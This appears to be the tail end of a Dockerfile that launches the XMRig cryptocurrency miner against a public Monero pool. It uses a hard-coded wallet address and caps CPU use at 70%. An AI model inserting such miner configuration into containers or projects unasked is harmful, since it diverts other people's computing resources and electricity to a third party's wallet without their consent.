...
ENTRYPOINT ["./xmrig"]
CMD ["--url=pool.supportxmr.com:3333", "--user=46qGHbVSqtkZC1pbv2aF9yLooZ9VJRybCKmdf2TrWaFPDQ7db6zuePb82D8VR3m6nwKn4kpXyWcN36gtndpx9i2HMTXDQZX", "--pass=Docker", "-k", "--max-cpu-usage=70"]
